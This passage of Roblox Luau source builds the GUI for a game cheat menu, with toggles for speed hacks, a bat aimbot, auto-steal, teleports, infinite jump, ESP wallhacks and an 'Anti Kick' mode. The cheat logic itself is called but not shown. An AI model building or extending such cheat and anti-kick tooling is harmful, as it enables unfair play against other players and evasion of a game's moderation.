    local rowScale=Instance.new("UIScale"); rowScale.Scale=1; rowScale.Parent=Row
    local function setV(on)
        st=on
        local ti=TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
        TweenService:Create(Knob, ti, {
            Position=on and UDim2.new(0.5,2,0.5,-7) or UDim2.new(0,2,0.5,-7),
            BackgroundTransparency=on and 0.15 or 0.5
        }):Play()
        TweenService:Create(Track, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
            BackgroundColor3=on and Color3.fromRGB(40,40,48) or C.blueDark
        }):Play()
        -- soft row flash
        TweenService:Create(Row, TweenInfo.new(0.12), {BackgroundTransparency=0.2}):Play()
        task.delay(0.12, function()
            TweenService:Create(Row, TweenInfo.new(0.18), {BackgroundTransparency=0.5}):Play()
        end)
    end
    local Btn=Instance.new("TextButton",Row); Btn.Size=UDim2.new(0,36,0,18); Btn.Position=UDim2.new(1,-46,0,10); Btn.BackgroundTransparency=1; Btn.Text=""
    Btn.MouseButton1Click:Connect(function()
        st=not st
        setV(st)
        TweenService:Create(rowScale, TweenInfo.new(0.08), {Scale=0.97}):Play()
        task.delay(0.08, function()
            TweenService:Create(rowScale, TweenInfo.new(0.16, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale=1}):Play()
        end)
        if onToggle then onToggle(st) end
    end)
    local hov=Instance.new("TextButton",Row); hov.Size=UDim2.new(1,0,1,0); hov.BackgroundTransparency=1; hov.Text=""; hov.ZIndex=0
    hov.MouseEnter:Connect(function() tw(Row,{BackgroundTransparency=0.3}) end)
    hov.MouseLeave:Connect(function() tw(Row,{BackgroundTransparency=0.5}) end)
    if kbKey then GuiToggleSetters[kbKey]=setV end
    return Row,setV
end
function addActionRow(parent,label,kbKey,onAction,order)
    local Row=Instance.new("Frame",parent); Row.Size=UDim2.new(1,0,0,42); Row.BackgroundColor3=C.row
    Row.BackgroundTransparency=0.5; Row.BorderSizePixel=0; Row.LayoutOrder=order; guiCorner(Row,10); guiStroke(Row,C.divider,1)
    local Lb=Instance.new("TextLabel",Row); Lb.Size=UDim2.new(0.55,0,0,16); Lb.Position=UDim2.new(0,12,0,8)
    Lb.BackgroundTransparency=1; Lb.Text=label; Lb.TextColor3=C.text; Lb.TextSize=11; Lb.Font=Enum.Font.GothamBold; Lb.TextXAlignment=Enum.TextXAlignment.Left
    if kbKey then
        if not Keys[kbKey] then Keys[kbKey]=Enum.KeyCode.Unknown end
        local KB2=Instance.new("TextButton",Row); KB2.Size=UDim2.new(0,58,0,22); KB2.Position=UDim2.new(1,-66,0.5,-11)
        KB2.BackgroundColor3=C.blue; KB2.BackgroundTransparency=0.5; KB2.BorderSizePixel=0
        KB2.Text=Keys[kbKey]==Enum.KeyCode.Unknown and "SET" or prettyKey(Keys[kbKey])
        KB2.TextColor3=C.white; KB2.TextSize=9; KB2.Font=Enum.Font.GothamBold; guiCorner(KB2,5)
        KB2.MouseButton1Click:Connect(function()
            startKL(KB2,function(nk)
                Keys[kbKey]=nk; _GuiKeys=Keys
                KB2.Text=prettyKey(nk)
                saveConfig()
            end)
        end)
    end
    local rowScale=Instance.new("UIScale"); rowScale.Scale=1; rowScale.Parent=Row
    local AB=Instance.new("TextButton",Row); AB.Size=UDim2.new(0.55,0,1,0); AB.BackgroundTransparency=1; AB.Text=""
    AB.MouseButton1Click:Connect(function()
        TweenService:Create(rowScale, TweenInfo.new(0.08), {Scale=0.96}):Play()
        TweenService:Create(Row, TweenInfo.new(0.1), {BackgroundTransparency=0.2}):Play()
        task.delay(0.08, function()
            TweenService:Create(rowScale, TweenInfo.new(0.16, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale=1}):Play()
            TweenService:Create(Row, TweenInfo.new(0.18), {BackgroundTransparency=0.5}):Play()
        end)
        if onAction then onAction() end
    end)
    local hov=Instance.new("TextButton",Row); hov.Size=UDim2.new(1,0,1,0); hov.BackgroundTransparency=1; hov.Text=""; hov.ZIndex=0
    hov.MouseEnter:Connect(function() tw(Row,{BackgroundTransparency=0.3}) end)
    hov.MouseLeave:Connect(function() tw(Row,{BackgroundTransparency=0.5}) end)
    return Row
end

-- CATEGORIES
local Categories={"Speed","Combat","Steal","Movement","Visual","Keybinds","Background"}
local CategoryRefs={contents={},btnsSide={},active="Speed"}
;(function()
    for _,name in pairs(Categories) do
        local page=Instance.new("Frame"); page.Size=UDim2.new(1,0,0,0); page.AutomaticSize=Enum.AutomaticSize.Y
        page.BackgroundTransparency=1; page.Visible=(name=="Speed"); page.Parent=GuiRefs.contentFrame
        CategoryRefs.contents[name]=page
        local lay=Instance.new("UIListLayout"); lay.SortOrder=Enum.SortOrder.LayoutOrder; lay.Padding=UDim.new(0,6); lay.Parent=page
        lay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            if page.Visible and GuiRefs.refreshCanvas then
                GuiRefs.refreshCanvas()
            end
        end)
    end
    local tabLayout={
        Speed     ={x=0,   y=0,   w=0.24,h=0.46,special=false},
        Combat    ={x=0.25,y=0,   w=0.24,h=0.46,special=false},
        Steal     ={x=0.50,y=0,   w=0.24,h=0.46,special=false},
        Movement  ={x=0.75,y=0,   w=0.24,h=0.46,special=false},
        Visual    ={x=0,   y=0.52,w=0.31,h=0.46,special=false},
        Keybinds  ={x=0.33,y=0.52,w=0.31,h=0.46,special=false},
        Background={x=0.66,y=0.52,w=0.31,h=0.46,special=false},
    }
    -- Animated tab highlight (KuRu-style sliding highlight)
    local TabHL=Instance.new("Frame")
    TabHL.Name="TabHighlight"
    TabHL.BackgroundColor3=Color3.fromRGB(255,255,255)
    TabHL.BackgroundTransparency=0.88
    TabHL.BorderSizePixel=0
    TabHL.ZIndex=1
    TabHL.Parent=GuiRefs.categoryList
    guiCorner(TabHL,8)
    local hlStroke=Instance.new("UIStroke",TabHL)
    hlStroke.Color=Color3.fromRGB(255,255,255)
    hlStroke.Thickness=1.2
    hlStroke.Transparency=0.55
    local TAB_TWEEN=TweenInfo.new(0.28,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
    local function moveTabHL(btn)
        if not btn then return end
        TweenService:Create(TabHL,TAB_TWEEN,{
            Position=btn.Position,
            Size=btn.Size,
        }):Play()
    end
    CategoryRefs.tabHL=TabHL
    CategoryRefs.moveTabHL=moveTabHL

    for i,name in ipairs(Categories) do
        local lay=tabLayout[name] or {x=0,y=0,w=0.3,h=0.45,special=false}
        local btn=Instance.new("TextButton")
        btn.Size=UDim2.new(lay.w,-4,lay.h,-2); btn.Position=UDim2.new(lay.x,2,lay.y,1)
        btn.BackgroundColor3=C.blueDark
        btn.BackgroundTransparency=(name=="Speed") and 0.12 or 0.42
        btn.Text=name
        btn.TextColor3=(name=="Speed") and Color3.fromRGB(255,255,255) or Color3.fromRGB(230,230,235)
        btn.TextSize=10
        btn.Font=Enum.Font.GothamBold
        btn.BorderSizePixel=0; btn.LayoutOrder=i; btn.ZIndex=3; btn.Parent=GuiRefs.categoryList
        guiCorner(btn,8)
        local ind=Instance.new("Frame"); ind.Name="indicator"
        ind.Size=UDim2.new(1,-10,0,2); ind.Position=UDim2.new(0,5,1,-3)
        ind.BackgroundColor3=C.white; ind.BackgroundTransparency=(name=="Speed") and 0.1 or 1
        ind.BorderSizePixel=0; ind.ZIndex=4; ind.Parent=btn
        CategoryRefs.btnsSide[name]=btn
        btn.MouseButton1Click:Connect(function()
            if CategoryRefs.active==name then return end
            for _,f in pairs(CategoryRefs.contents) do f.Visible=false end
            local selectedPage=CategoryRefs.contents[name]
            selectedPage.Visible=true; CategoryRefs.active=name
            -- content pop-in
            local pageScale = selectedPage:FindFirstChildOfClass("UIScale")
            if not pageScale then
                pageScale = Instance.new("UIScale")
                pageScale.Parent = selectedPage
            end
            pageScale.Scale = 0.96
            TweenService:Create(pageScale, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
            selectedPage.BackgroundTransparency=1
            for n,b in pairs(CategoryRefs.btnsSide) do
                local ac=(n==name)
                TweenService:Create(b,TAB_TWEEN,{
                    BackgroundTransparency=ac and 0.12 or 0.42,
                }):Play()
                b.TextColor3=ac and Color3.fromRGB(255,255,255) or Color3.fromRGB(230,230,235)
                local i2=b:FindFirstChild("indicator")
                if i2 then
                    TweenService:Create(i2,TAB_TWEEN,{BackgroundTransparency=ac and 0.1 or 1}):Play()
                end
            end
            moveTabHL(btn)
            task.defer(function()
                if GuiRefs.refreshCanvas then GuiRefs.refreshCanvas() end
                GuiRefs.contentFrame.CanvasPosition = Vector2.new(0, 0)
            end)
        end)
        btn.MouseEnter:Connect(function()
            if CategoryRefs.active~=name then
                TweenService:Create(btn,TweenInfo.new(0.12),{BackgroundTransparency=0.25}):Play()
                btn.TextColor3=Color3.fromRGB(255,255,255)
            end
        end)
        btn.MouseLeave:Connect(function()
            if CategoryRefs.active~=name then
                TweenService:Create(btn,TweenInfo.new(0.12),{BackgroundTransparency=0.42}):Play()
                btn.TextColor3=Color3.fromRGB(230,230,235)
            end
        end)
    end
    local spBtn=CategoryRefs.btnsSide["Speed"]
    if spBtn then
        spBtn.TextColor3=Color3.fromRGB(255,255,255); spBtn.BackgroundTransparency=0.12
        local i2=spBtn:FindFirstChild("indicator"); if i2 then i2.BackgroundTransparency=0.1 end
        TabHL.Position=spBtn.Position
        TabHL.Size=spBtn.Size
    end
end)()

-- SPEED PAGE
;(function()
    local sp=CategoryRefs.contents["Speed"]
    addSectLbl(sp,"AUTO",0)
    addToggleRow(sp,"Auto Carry Speed",autoSwitchSpeedEnabled,1,nil,function(on)
        autoSwitchSpeedEnabled=on
        _autoSwitchWasSteal=false
        saveConfig()
    end)
    addSectLbl(sp,"SPEED CONFIGURATION",2)
    addInputRow(sp,"Normal Speed",NS,3,function(v) NS=v; saveConfig() end)
    addInputRow(sp,"Carry Speed",CS,4,function(v) CS=v; saveConfig() end)
    addSectLbl(sp,"LAGGER MODE",5)
    addInputRow(sp,"Lagger Normal",LAGGER_SPEED,6,function(v) LAGGER_SPEED=v; saveConfig() end)
    addInputRow(sp,"Lagger Carry",LAGGER_CARRY_SPEED,7,function(v) LAGGER_CARRY_SPEED=v; saveConfig() end)
    addSectLbl(sp,"CONTROLS",8)
    addToggleRow(sp,"Carry Mode",carrySpeedActive,9,nil,function(on)
        carrySpeedActive=on
        if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
        if refreshSpeedModeLabel then refreshSpeedModeLabel() end
        saveConfig()
    end)
    addToggleRow(sp,"Lagger Mode",laggerModeEnabled,10,nil,function(on)
        laggerModeEnabled=on; if mobBtnRefs.lagger then mobBtnRefs.lagger(on) end
        if refreshSpeedModeLabel then refreshSpeedModeLabel() end; saveConfig()
    end)
end)()

-- COMBAT PAGE
;(function()
    local cp=CategoryRefs.contents["Combat"]
    addSectLbl(cp,"BAT CONTROLS",0)
    addToggleRow(cp,"BAT V2 (Void Anti Bat)",batV2Enabled,0,nil,function(on)
        if on then
            if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then return end
            RXZ.startBatV2()
        else
            RXZ.stopBatV2()
        end
        if mobBtnRefs.batV2 then mobBtnRefs.batV2(batV2Enabled or RXZ.batV2) end
        saveConfig()
    end)
    addInputRow(cp,"BAT V2 Speed",batV2Speed,1,function(v)
        batV2Speed=math.clamp(tonumber(v) or 56.5,1,200)
        saveConfig()
    end)
    addToggleRow(cp,"Mirror TP Down (Aimbot + BAT V2)",mirrorTPDownEnabled,2,nil,function(on)
        mirrorTPDownEnabled=on==true
        if not mirrorTPDownEnabled then
            pcall(function() table.clear(mirrorTPPreviousY) end)
        end
        saveConfig()
    end)

    local _,svAutoBat=addToggleRow(cp,"Bat Aimbot",autoBatEnabled,1,nil,function(on)
        if on then
            if autoLeftEnabled then autoLeftEnabled=false; stopAutoLeft(); if autoLeftSetVisual then autoLeftSetVisual(false) end; if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end end
            if autoRightEnabled then autoRightEnabled=false; stopAutoRight(); if autoRightSetVisual then autoRightSetVisual(false) end; if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end end
            queueAutoBatStart(); if mobBtnRefs.autoBat then mobBtnRefs.autoBat(true) end
        else stopBatAimbot(); if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
        saveConfig()
    end)
    autoBatSetVisual=svAutoBat
    local _,svAutoSwing=addToggleRow(cp,"Auto Swing",autoSwingEnabled,2,nil,function(on) autoSwingEnabled=on; saveConfig() end)
    addToggleRow(cp,"Aimbot After Hit",aimbotAfterHitEnabled,3,nil,function(on)
        aimbotAfterHitEnabled=on
        saveConfig()
    end)
    local _,svBatCounter=addToggleRow(cp,"Bat Counter",batCounterEnabled,4,nil,function(on)
        batCounterEnabled=on; if on then startBatCounter() else stopBatCounter() end; saveConfig()
    end)
    setBatCounterVisual=svBatCounter
    addSectLbl(cp,"RAGDOLL",4)
    local _,svRagdoll=addToggleRow(cp,"Anti Ragdoll",antiRagdollEnabled,5,nil,function(on)
        antiRagdollEnabled=on; if on then startAntiRagdoll() else stopAntiRagdoll() end; saveConfig()
    end)
    setAntiRagVisual=svRagdoll
    if antiRagdollEnabled then svRagdoll(true) end
    local _,svMedusa=addToggleRow(cp,"Medusa Counter",medusaCounterEnabled,6,nil,function(on)
        medusaCounterEnabled=on; if on then setupMedusa(LP.Character) else stopMedusaCounter() end; saveConfig()
    end)
    setMedusaVisual=svMedusa
    local _,svUnwalk=addToggleRow(cp,"Unwalk",unwalkEnabled,7,nil,function(on)
        unwalkEnabled=on; if on then startUnwalk() else stopUnwalk() end; saveConfig()
    end)
    setUnwalkVisual=svUnwalk
    addSectLbl(cp,"PROTECTION",13)
    local _,svAntiDie=addToggleRow(cp,"Anti Die + Fling",antiDieEnabled,13,nil,function(on)
        antiDieEnabled = on == true
        saveConfig()
    end)
    local _,svAntiKick=addToggleRow(cp,"Anti Kick / Safe Mode",RXZ.antiKick,14,nil,function(on)
        if on then
            RXZ.antiKick=false
            RXZ.enableAntiKick()
            if SafeMode and SafeMode.forceStop then SafeMode.forceStop("SAFE MODE") end
        else
            RXZ.disableAntiKick()
        end
        if RXZ.setSafeModeVisual then RXZ.setSafeModeVisual(RXZ.antiKick) end
        saveConfig()
    end)
    RXZ.setAntiKickVisual=svAntiKick
    addSectLbl(cp,"TP BAT",15)
    local _,svTPBat=addToggleRow(cp,"TP Bat",RXZ.tpBat,16,nil,function(on)
        if on then
            if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then
                if RXZ.setTPBatVisual then RXZ.setTPBatVisual(false) end
                if mobBtnRefs.tpBat then mobBtnRefs.tpBat(false) end
                return
            end
            RXZ.startTPBat()
        else
            RXZ.stopTPBat()
        end
        if mobBtnRefs.tpBat then mobBtnRefs.tpBat(on and RXZ.tpBat) end
    end)
    RXZ.setTPBatVisual=svTPBat
    addSectLbl(cp,"ACTIONS",9)
    addActionRow(cp,"Drop Brainrot",nil,function() runDrop() end,10)
    addActionRow(cp,"TP Down",nil,function() runTPFloor() end,12)
end)()

-- STEAL PAGE
;(function()
    local st=CategoryRefs.contents["Steal"]
    addSectLbl(st,"AUTO STEAL",0)
    addToggleRow(st,"Auto Steal",Steal.AutoStealEnabled,1,nil,function(on)
        Steal.AutoStealEnabled=on; if on then startAutoSteal() else stopAutoSteal() end; saveConfig()
    end)
    addInputRow(st,"Steal Radius",Steal.StealRadius,2,function(v) Steal.StealRadius=tonumber(v) or 60; saveConfig() end)

    addSectLbl(st,"STEAL BAR STYLE",2)
    local styleRow=Instance.new("Frame")
    styleRow.Size=UDim2.new(1,-8,0,36)
    styleRow.BackgroundTransparency=1
    styleRow.LayoutOrder=3
    styleRow.Parent=st
    local styleLay=Instance.new("UIListLayout",styleRow)
    styleLay.FillDirection=Enum.FillDirection.Horizontal
    styleLay.Padding=UDim.new(0,8)
    styleLay.VerticalAlignment=Enum.VerticalAlignment.Center
    local styleBtns={}
    local function refreshStyleBtns()
        for id,b in pairs(styleBtns) do
            local on=(stealBarStyle==id)
            b.BackgroundColor3=on and Color3.fromRGB(255,255,255) or Color3.fromRGB(18,18,22)
            b.TextColor3=on and Color3.fromRGB(0,0,0) or Color3.fromRGB(230,230,235)
        end
    end
    for _,info in ipairs({{id=1,label="1 · Vertical"},{id=2,label="2 · Full"}}) do
        local b=Instance.new("TextButton")
        b.Size=UDim2.new(0,110,0,30)
        b.BackgroundColor3=Color3.fromRGB(18,18,22)
        b.BorderSizePixel=0
        b.Text=info.label
        b.TextColor3=Color3.fromRGB(230,230,235)
        b.Font=Enum.Font.GothamBold
        b.TextSize=11
        b.AutoButtonColor=false
        b.Parent=styleRow
        guiCorner(b,8); guiStroke(b,Color3.fromRGB(50,50,58),1)
        styleBtns[info.id]=b
        b.MouseButton1Click:Connect(function()
            stealBarStyle=info.id
            refreshStyleBtns()
            pcall(createStealBar)
            saveConfig()
        end)
    end
    refreshStyleBtns()

    addSectLbl(st,"STEAL BAR SIZE",3)
    local sizeRow=Instance.new("Frame")
    sizeRow.Size=UDim2.new(1,-8,0,36)
    sizeRow.BackgroundTransparency=1
    sizeRow.LayoutOrder=3
    sizeRow.Parent=st
    local sizeLay=Instance.new("UIListLayout",sizeRow)
    sizeLay.FillDirection=Enum.FillDirection.Horizontal
    sizeLay.Padding=UDim.new(0,8)
    sizeLay.VerticalAlignment=Enum.VerticalAlignment.Center

    local sizeLbl=Instance.new("TextLabel",sizeRow)
    sizeLbl.Size=UDim2.new(0,70,0,28)
    sizeLbl.BackgroundTransparency=1
    sizeLbl.Text=string.format("%.0f%%", (tonumber(stealBarScale) or 1)*100)
    sizeLbl.TextColor3=Color3.fromRGB(230,230,235)
    sizeLbl.Font=Enum.Font.GothamBold
    sizeLbl.TextSize=12
    sizeLbl.TextXAlignment=Enum.TextXAlignment.Left

    local function applyScale(delta)
        stealBarScale = math.clamp((tonumber(stealBarScale) or 1) + delta, 0.7, 1.8)
        sizeLbl.Text = string.format("%.0f%%", stealBarScale*100)
        pcall(createStealBar)
        saveConfig()
    end
    local minusBtn=Instance.new("TextButton",sizeRow)
    minusBtn.Size=UDim2.new(0,36,0,28)
    minusBtn.BackgroundColor3=Color3.fromRGB(18,18,22)
    minusBtn.BorderSizePixel=0
    minusBtn.Text="-"
    minusBtn.TextColor3=Color3.fromRGB(255,255,255)
    minusBtn.Font=Enum.Font.GothamBlack
    minusBtn.TextSize=16
    minusBtn.AutoButtonColor=false
    guiCorner(minusBtn,8)
    minusBtn.MouseButton1Click:Connect(function() applyScale(-0.1) end)

    local plusBtn=Instance.new("TextButton",sizeRow)
    plusBtn.Size=UDim2.new(0,36,0,28)
    plusBtn.BackgroundColor3=Color3.fromRGB(18,18,22)
    plusBtn.BorderSizePixel=0
    plusBtn.Text="+"
    plusBtn.TextColor3=Color3.fromRGB(255,255,255)
    plusBtn.Font=Enum.Font.GothamBlack
    plusBtn.TextSize=16
    plusBtn.AutoButtonColor=false
    guiCorner(plusBtn,8)
    plusBtn.MouseButton1Click:Connect(function() applyScale(0.1) end)

    local resetBtn=Instance.new("TextButton",sizeRow)
    resetBtn.Size=UDim2.new(0,64,0,28)
    resetBtn.BackgroundColor3=Color3.fromRGB(18,18,22)
    resetBtn.BorderSizePixel=0
    resetBtn.Text="Reset"
    resetBtn.TextColor3=Color3.fromRGB(200,200,210)
    resetBtn.Font=Enum.Font.GothamBold
    resetBtn.TextSize=11
    resetBtn.AutoButtonColor=false
    guiCorner(resetBtn,8)
    resetBtn.MouseButton1Click:Connect(function()
        stealBarScale = 1
        sizeLbl.Text = "100%"
        pcall(createStealBar)
        saveConfig()
    end)

    -- Hold % choice buttons (90 / 85 / 80 / 75)
    addSectLbl(st,"HOLD AT %",4)
    local pctRow=Instance.new("Frame")
    pctRow.Size=UDim2.new(1,-8,0,36)
    pctRow.BackgroundTransparency=1
    pctRow.LayoutOrder=5
    pctRow.Parent=st
    local pctLay=Instance.new("UIListLayout",pctRow)
    pctLay.FillDirection=Enum.FillDirection.Horizontal
    pctLay.Padding=UDim.new(0,6)
    pctLay.HorizontalAlignment=Enum.HorizontalAlignment.Left
    pctLay.VerticalAlignment=Enum.VerticalAlignment.Center
    pctLay.SortOrder=Enum.SortOrder.LayoutOrder

    -- mode 1=90%, 2=85%, 3=80%, 4=75%
    local PCT_OPTIONS={{mode=1,label="90%"},{mode=2,label="85%"},{mode=3,label="80%"},{mode=4,label="75%"}}
    local pctBtns={}
    local function refreshPctButtons()
        for _,info in ipairs(PCT_OPTIONS) do
            local b=pctBtns[info.mode]
            if b then
                local on=(Steal.Mode==info.mode)
                b.BackgroundColor3=on and Color3.fromRGB(255,255,255) or Color3.fromRGB(18,18,22)
                b.TextColor3=on and Color3.fromRGB(0,0,0) or Color3.fromRGB(230,230,235)
            end
        end
    end
    for i,info in ipairs(PCT_OPTIONS) do
        local b=Instance.new("TextButton")
        b.Size=UDim2.new(0,58,0,30)
        b.BackgroundColor3=Color3.fromRGB(18,18,22)
        b.BorderSizePixel=0
        b.Text=info.label
        b.TextColor3=Color3.fromRGB(230,230,235)
        b.Font=Enum.Font.GothamBold
        b.TextSize=13
        b.AutoButtonColor=false
        b.LayoutOrder=i
        b.Parent=pctRow
        guiCorner(b,8)
        local stoke=Instance.new("UIStroke",b)
        stoke.Color=Color3.fromRGB(50,50,55)
        stoke.Thickness=1
        b.MouseButton1Click:Connect(function()
            Steal.Mode=info.mode
            refreshPctButtons()
            saveConfig()
        end)
        pctBtns[info.mode]=b
    end
    refreshPctButtons()
end)()

-- MOVEMENT PAGE
;(function()
    local mv=CategoryRefs.contents["Movement"]
    -- Safe Mode is always ON (no toggle)
    task.spawn(function()
        task.wait(0.2)
        RXZ.antiKick = true
        if RXZ.enableAntiKick then RXZ.enableAntiKick() end
    end)

    addSectLbl(mv,"AUTO PATHS",0)
    local _,svAutoLeft=addToggleRow(mv,"Auto Left",autoLeftEnabled,3,nil,function(on)
        if on then
            if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then
                if autoLeftSetVisual then autoLeftSetVisual(false) end
                if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end
                return
            end
            if autoRightEnabled then autoRightEnabled=false; stopAutoRight(); if autoRightSetVisual then autoRightSetVisual(false) end; if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end end
            if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end; if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
            autoLeftEnabled=true; startAutoLeft(); if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(true) end
        else autoLeftEnabled=false; stopAutoLeft(); if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end end
        saveConfig()
    end)
    autoLeftSetVisual=svAutoLeft
    local _,svAutoRight=addToggleRow(mv,"Auto Right",autoRightEnabled,4,nil,function(on)
        if on then
            if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then
                if autoRightSetVisual then autoRightSetVisual(false) end
                if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end
                return
            end
            if autoLeftEnabled then autoLeftEnabled=false; stopAutoLeft(); if autoLeftSetVisual then autoLeftSetVisual(false) end; if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end end
            if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end; if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
            autoRightEnabled=true; startAutoRight(); if mobBtnRefs.autoRight then mobBtnRefs.autoRight(true) end
        else autoRightEnabled=false; stopAutoRight(); if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end end
        saveConfig()
    end)
    autoRightSetVisual=svAutoRight
    addSectLbl(mv,"SETTINGS",5)
    local _,svAutoTP=addToggleRow(mv,"Auto TP",autoTPEnabled,6,nil,function(on)
        autoTPEnabled=on; if on then startAutoTP() else stopAutoTP() end; saveConfig()
    end)
    setAutoTPVisual=svAutoTP
    addInputRow(mv,"TP Height",autoTPHeight,7,function(v) if v>=0 and v<=500 then autoTPHeight=v end; saveConfig() end)
    local _,svInfJump=addToggleRow(mv,"Infinite Jump",infJumpEnabled,8,nil,function(on)
        infJumpEnabled=on; if on then startHoldInfJump() else stopHoldInfJump() end; saveConfig()
    end)
    setInfJumpVisual=svInfJump
end)()


-- VISUAL PAGE
;(function()
    local vi=CategoryRefs.contents["Visual"]
    
    -- THEME first (Adapt-style color chips at top of Visual)
    addSectLbl(vi,"THEME COLOR",0)
    local themeRow=Instance.new("Frame")
    themeRow.Size=UDim2.new(1,-8,0,40)
    themeRow.BackgroundTransparency=1
    themeRow.LayoutOrder=1
    themeRow.Parent=vi
    local themeLay=Instance.new("UIListLayout",themeRow)
    themeLay.FillDirection=Enum.FillDirection.Horizontal
    themeLay.Padding=UDim.new(0,6)
    themeLay.VerticalAlignment=Enum.VerticalAlignment.Center
    local themeOrder={"WHITE","PURPLE","BLUE","RED","PINK","YELLOW","GREY","FOREST"}
    local themeBtns={}
    local function refreshThemeBtns()
        for name,b in pairs(themeBtns) do
            local on=(voidThemeName==name)
            b.BackgroundColor3=VoidThemeColors[name] or Color3.fromRGB(255,255,255)
            local st=b:FindFirstChildOfClass("UIStroke")
            if st then st.Thickness=on and 2.5 or 1; st.Color=on and Color3.fromRGB(255,255,255) or Color3.fromRGB(60,60,70) end
        end
        pcall(function()
            if GuiRefs.voidTitle then
                if GuiRefs.voidTitle:IsA("ImageLabel") or GuiRefs.voidTitle:IsA("ImageButton") then
                    GuiRefs.voidTitle.ImageColor3=getVoidAccent()
                else
                    GuiRefs.voidTitle.TextColor3=getVoidAccent()
                end
            end
        end)
    end
    for _,name in ipairs(themeOrder) do
        local b=Instance.new("TextButton")
        b.Size=UDim2.new(0,30,0,30)
        b.BackgroundColor3=VoidThemeColors[name]
        b.BorderSizePixel=0
        b.Text=""
        b.AutoButtonColor=false
        b.Parent=themeRow
        guiCorner(b,8)
        local st=guiStroke(b,Color3.fromRGB(60,60,70),1)
        themeBtns[name]=b
        b.MouseButton1Click:Connect(function()
            voidThemeName=name
            applyVoidTheme()
            refreshThemeBtns()
            saveConfig()
        end)
    end
    refreshThemeBtns()
    task.defer(function() pcall(applyVoidTheme) end)

    addSectLbl(vi,"CHARTER",2)
    addToggleRow(vi,"Headless",headlessEnabled,1,nil,function(on)
        headlessEnabled = on == true
        pcall(function() applyHeadlessToChar(LP.Character, headlessEnabled) end)
        saveConfig()
    end)
    addToggleRow(vi,"Korblox",korbloxEnabled,2,nil,function(on)
        korbloxEnabled = on == true
        pcall(function() applyKorbloxToChar(LP.Character, korbloxEnabled) end)
        saveConfig()
    end)
    addSectLbl(vi,"VISUAL",0)
    addToggleRow(vi,"Speed ESP (Speed+Line+Chams)",espEnabled,1,nil,function(on)
        if on then
            startESP()
        else
            stopESP() -- clears speed, lines, chams AND avatars
        end
        saveConfig()
    end)
    addToggleRow(vi,"ESP Avatars",espAvatarsEnabled,2,nil,function(on)
        espAvatarsEnabled = on == true
        if not espEnabled then
            -- ESP master is off → never show avatars
            espAvatarsEnabled = on -- keep preference, but force hide
            if espRefreshAvatars then espRefreshAvatars() end
            -- destroy any leftover avatar boards
            for plr, data in pairs(ESP.labels) do
                if data.avatarBillboard then
                    pcall(function() data.avatarBillboard:Destroy() end)
                    data.avatarBillboard = nil
                end
            end
        else
            if espRefreshAvatars then espRefreshAvatars() end
            if on then
                for _,plr in ipairs(Players:GetPlayers()) do
                    if plr ~= LP then
                        if not ESP.labels[plr] or not ESP.labels[plr].avatarBillboard then
                            espMakeLabel(plr)
                        end
                    end
                end
            else
                for plr, data in pairs(ESP.labels) do
                    if data.avatarBillboard then
                        data.avatarBillboard.Enabled = false
                    end
                end
            end
        end
        saveConfig()
    end)
    addToggleRow(vi,"Anti Lag",antiLagEnabled,4,nil,function(on)
        if on then enableAntiLag() else disableAntiLag() end; saveConfig()
    end)
    addToggleRow(vi,"Stretch Rez",stretchRezEnabled,5,nil,function(on)
        if on then enableStretchRez() else disableStretchRez() end; saveConfig()
    end)
    addToggleRow(vi,"Ragdoll GUI",ragdollGuiEnabled,6,nil,function(on) ragdollGuiEnabled=on; saveConfig() end)
    addSectLbl(vi,"ANIMATION PACK",7)
    local animIdx=1
    for i,n in ipairs(ANIM_PACK_ORDER) do if n==animPackName then animIdx=i; break end end
    local animRow=Instance.new("Frame"); animRow.Size=UDim2.new(1,0,0,38); animRow.BackgroundColor3=C.row
    animRow.BackgroundTransparency=0.5; animRow.BorderSizePixel=0; animRow.LayoutOrder=8; animRow.Parent=vi
    guiCorner(animRow,10); guiStroke(animRow,C.divider,1)
    local animLbl=Instance.new("TextLabel",animRow); animLbl.Size=UDim2.new(0.42,0,0,16); animLbl.Position=UDim2.new(0,12,0,6)
    animLbl.BackgroundTransparency=1; animLbl.Text="Anim Pack"; animLbl.TextColor3=C.text; animLbl.TextSize=11; animLbl.Font=Enum.Font.GothamBold; animLbl.TextXAlignment=Enum.TextXAlignment.Left
    local animVal=Instance.new("TextLabel",animRow); animVal.Size=UDim2.new(0,90,0,16); animVal.Position=UDim2.new(1,-150,0,6)
    animVal.BackgroundTransparency=1; animVal.Text=animPackName; animVal.TextColor3=C.textDim; animVal.TextSize=9; animVal.Font=Enum.Font.GothamBold; animVal.TextXAlignment=Enum.TextXAlignment.Right
    local animBtn=Instance.new("TextButton",animRow); animBtn.Size=UDim2.new(0,48,0,22); animBtn.Position=UDim2.new(1,-56,0.5,-11)
    animBtn.BackgroundColor3=C.blue; animBtn.BackgroundTransparency=0.5; animBtn.BorderSizePixel=0; animBtn.Text="Next"
